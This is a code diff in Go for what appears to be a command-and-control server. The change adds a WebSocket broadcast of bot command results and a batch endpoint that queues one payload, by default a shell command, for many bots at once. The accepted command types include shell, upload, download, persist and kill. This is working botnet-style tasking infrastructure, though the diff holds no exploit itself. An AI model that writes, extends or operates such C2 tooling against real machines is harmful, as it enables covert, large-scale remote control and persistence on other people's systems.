@@ -9,11 +9,12 @@ import (
 )
 
 type CommandHandler struct {
-	db *database.DB
+	db  *database.DB
+	hub *WSHub
 }
 
-func NewCommandHandler(db *database.DB) *CommandHandler {
-	return &CommandHandler{db: db}
+func NewCommandHandler(db *database.DB, hub *WSHub) *CommandHandler {
+	return &CommandHandler{db: db, hub: hub}
 }
 
 func (h *CommandHandler) Create(c *fiber.Ctx) error {
@@ -132,16 +133,26 @@ func (h *CommandHandler) SubmitResult(c *fiber.Ctx) error {
 	}
 
 	now := time.Now()
-	result, err := h.db.Exec(`
+	var botID string
+	err := h.db.QueryRow(`
 		UPDATE commands SET output = $1, status = $2, executed_at = $3
-		WHERE id = $4`, req.Output, req.Status, now, req.CommandID)
+		WHERE id = $4 RETURNING bot_id`, req.Output, req.Status, now, req.CommandID).Scan(&botID)
 	if err != nil {
-		return c.Status(500).JSON(fiber.Map{"error": "failed to submit result"})
-	}
-	rows, _ := result.RowsAffected()
-	if rows == 0 {
 		return c.Status(404).JSON(fiber.Map{"error": "command not found"})
 	}
+
+	if h.hub != nil {
+		h.hub.Broadcast(botID, WSMessage{
+			Type:      "result",
+			BotID:     botID,
+			CommandID: req.CommandID,
+			Data: fiber.Map{
+				"output": req.Output,
+				"status": req.Status,
+			},
+		})
+	}
+
 	return c.JSON(fiber.Map{"status": "received"})
 }
 
@@ -173,4 +184,56 @@ func (h *CommandHandler) History(c *fiber.Ctx) error {
 		cmds = []fiber.Map{}
 	}
 	return c.JSON(fiber.Map{"commands": cmds})
+}
+
+func (h *CommandHandler) BatchCreate(c *fiber.Ctx) error {
+	var req struct {
+		BotIDs  []string `json:"bot_ids"`
+		Type    string   `json:"type"`
+		Payload string   `json:"payload"`
+		Timeout int      `json:"timeout"`
+	}
+	if err := c.BodyParser(&req); err != nil {
+		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
+	}
+	if len(req.BotIDs) == 0 {
+		return c.Status(400).JSON(fiber.Map{"error": "bot_ids required"})
+	}
+	if req.Payload == "" {
+		return c.Status(400).JSON(fiber.Map{"error": "payload required"})
+	}
+	if len(req.Payload) > 1048576 {
+		return c.Status(400).JSON(fiber.Map{"error": "payload too large (max 1MB)"})
+	}
+	if req.Type == "" {
+		req.Type = models.CmdTypeShell
+	}
+	if req.Timeout < 0 || req.Timeout > 3600 {
+		return c.Status(400).JSON(fiber.Map{"error": "timeout must be 0-3600 seconds"})
+	}
+
+	validTypes := map[string]bool{
+		models.CmdTypeShell: true, models.CmdTypeUpload: true, models.CmdTypeDownload: true,
+		models.CmdTypeSleep: true, models.CmdTypePersist: true, models.CmdTypeKill: true,
+	}
+	if !validTypes[req.Type] {
+		return c.Status(400).JSON(fiber.Map{"error": "invalid command type"})
+	}
+
+	var results []fiber.Map
+	for _, botID := range req.BotIDs {
+		var cmdID string
+		err := h.db.QueryRow(`
+			INSERT INTO commands (bot_id, type, payload, timeout_seconds)
+			VALUES ($1, $2, $3, $4) RETURNING id`,
+			botID, req.Type, req.Payload, req.Timeout,
+		).Scan(&cmdID)
+		if err != nil {
+			results = append(results, fiber.Map{"bot_id": botID, "error": "failed"})
+			continue
+		}
+		results = append(results, fiber.Map{"bot_id": botID, "id": cmdID, "status": "pending"})
+	}
+
+	return c.Status(201).JSON(fiber.Map{"commands": results})
 }
